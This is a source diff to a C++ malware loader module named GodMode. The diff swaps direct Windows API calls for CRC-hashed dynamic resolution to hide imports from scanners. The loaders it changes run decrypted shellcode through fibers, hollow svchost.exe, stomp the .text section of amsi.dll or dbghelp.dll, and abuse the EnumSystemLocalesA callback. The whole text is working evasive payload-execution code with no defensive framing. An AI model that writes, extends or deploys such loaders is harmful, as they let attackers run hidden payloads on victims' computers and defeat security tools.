@@ -9,6 +9,7 @@
 // 
 
 #include "GodMode.h"
+#include "ApiResolver.h"
 
 namespace GodMode
 {
@@ -33,8 +34,14 @@ namespace GodMode
     {
         void RunFiber(void* payload, size_t size)
         {
+            HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+            if (!hK32) return;
+            auto pVA = (LPVOID(WINAPI*)(LPVOID,SIZE_T,DWORD,DWORD))Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualAlloc);
+            auto pVF = (BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD))Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualFree);
+            if (!pVA || !pVF) return;
+
             // 1. Allocate RWX Memory
-            void* execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            void* execMem = pVA(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
             if (!execMem) return;
 
             // 2. Copy payload (decrypted shellcode)
@@ -44,7 +51,7 @@ namespace GodMode
             void* mainFiber = ConvertThreadToFiber(NULL);
             if (!mainFiber)
             {
-                VirtualFree(execMem, 0, MEM_RELEASE);
+                pVF(execMem, 0, MEM_RELEASE);
                 return;
             }
 
@@ -52,7 +59,7 @@ namespace GodMode
             void* payloadFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);
             if (!payloadFiber)
             {
-                VirtualFree(execMem, 0, MEM_RELEASE);
+                pVF(execMem, 0, MEM_RELEASE);
                 return;
             }
 
@@ -61,11 +68,16 @@ namespace GodMode
 
             // Cleanup (reached if payload returns)
             DeleteFiber(payloadFiber);
-            VirtualFree(execMem, 0, MEM_RELEASE);
+            pVF(execMem, 0, MEM_RELEASE);
         }
 
         void RunPE(void* payload, size_t size)
         {
+            HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+            if (!hK32) return;
+            auto pCH = (BOOL(WINAPI*)(HANDLE))Api::GetProcByHashCrc(hK32, Api::CrcFn::CloseHandle);
+            if (!pCH) return;
+
             // Process Hollowing via svchost.exe
             STARTUPINFOW si = { sizeof(si) };
             PROCESS_INFORMATION pi = { 0 };
@@ -83,8 +95,8 @@ namespace GodMode
             if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
             {
                 TerminateProcess(pi.hProcess, 0);
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
+                pCH(pi.hProcess);
+                pCH(pi.hThread);
                 return;
             }
 
@@ -92,8 +104,8 @@ namespace GodMode
             if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
             {
                 TerminateProcess(pi.hProcess, 0);
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
+                pCH(pi.hProcess);
+                pCH(pi.hThread);
                 return;
             }
 
@@ -131,8 +143,8 @@ namespace GodMode
             if (!remoteMem)
             {
                 TerminateProcess(pi.hProcess, 0);
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
+                pCH(pi.hProcess);
+                pCH(pi.hThread);
                 return;
             }
 
@@ -168,18 +180,24 @@ namespace GodMode
             SetThreadContext(pi.hThread, &ctx);
             ResumeThread(pi.hThread);
 
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
+            pCH(pi.hProcess);
+            pCH(pi.hThread);
         }
 
         void ModuleStomp(void* payload, size_t size)
         {
+            HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+            if (!hK32) return;
+            auto pLL = (HMODULE(WINAPI*)(LPCSTR))Api::GetProcByHashCrc(hK32, Api::CrcFn::LoadLibraryA);
+            auto pVP = (BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD,PDWORD))Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualProtect);
+            if (!pLL || !pVP) return;
+
             // Load a legitimate, rarely-used DLL (stack-built strings)
             char amsiStr[] = { 'a','m','s','i','.','d','l','l', 0 };
             char dbgStr[]  = { 'd','b','g','h','e','l','p','.','d','l','l', 0 };
-            HMODULE hModule = LoadLibraryA(amsiStr);
+            HMODULE hModule = pLL(amsiStr);
             if (!hModule)
-                hModule = LoadLibraryA(dbgStr); // Fallback
+                hModule = pLL(dbgStr); // Fallback
             if (!hModule) return;
 
             // Get the .text section of the loaded module
@@ -204,13 +222,13 @@ namespace GodMode
 
             // Make writable + executable
             DWORD oldProtect;
-            VirtualProtect(textSection, size, PAGE_EXECUTE_READWRITE, &oldProtect);
+            pVP(textSection, size, PAGE_EXECUTE_READWRITE, &oldProtect);
 
             // Overwrite .text with our payload
             memcpy(textSection, payload, size);
 
             // Restore to RX (looks legit in memory scanners)
-            VirtualProtect(textSection, size, PAGE_EXECUTE_READ, &oldProtect);
+            pVP(textSection, size, PAGE_EXECUTE_READ, &oldProtect);
 
             // Execute from the stomped section
             void* mainFiber = ConvertThreadToFiber(NULL);
@@ -227,8 +245,14 @@ namespace GodMode
 
         void CallbackProxy(void* payload, size_t size)
         {
+            HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+            if (!hK32) return;
+            auto pVA = (LPVOID(WINAPI*)(LPVOID,SIZE_T,DWORD,DWORD))Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualAlloc);
+            auto pVF = (BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD))Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualFree);
+            if (!pVA || !pVF) return;
+
             // Allocate RWX memory and copy shellcode
-            void* execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            void* execMem = pVA(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
             if (!execMem) return;
             memcpy(execMem, payload, size);
 
@@ -236,7 +260,7 @@ namespace GodMode
             // Windows calls our function pointer as if it's a locale enumerator
             EnumSystemLocalesA((LOCALE_ENUMPROCA)execMem, LCID_INSTALLED);
 
-            VirtualFree(execMem, 0, MEM_RELEASE);
+            pVF(execMem, 0, MEM_RELEASE);
         }
     }
 }
